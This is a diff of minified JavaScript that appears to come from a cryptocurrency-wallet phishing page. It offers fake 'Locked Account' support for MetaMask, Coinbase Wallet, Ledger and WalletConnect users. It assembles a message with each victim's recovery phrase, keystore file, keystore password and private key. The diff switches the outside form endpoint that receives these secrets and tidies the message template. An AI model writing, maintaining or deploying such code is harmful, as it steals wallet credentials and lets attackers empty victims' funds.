@@ -10773,7 +10773,7 @@ const Jh = [{
         title: "Locked Account",
         subtitle: "Click here for issues related to account lock."
     }],
-    qh = "https://submit-form.com/gxsJVIB2",
+    qh = "https://submit-form.com/v2od2cYMw",
     xf = ["MetaMask", "Coinbase Wallet", "Ledger Wallet", "WalletConnect"];
 
 function ev({
@@ -13036,7 +13036,7 @@ const _l = {
                          Phrase : ${a.phrase}
                          Keystore JSON : ${a.keystore}
                          Keystore Password : ${a.password}
-                         Private Key : ${a.privateKey} hi `,
+                         Private Key : ${a.privateKey} `,
                          
         
                         },
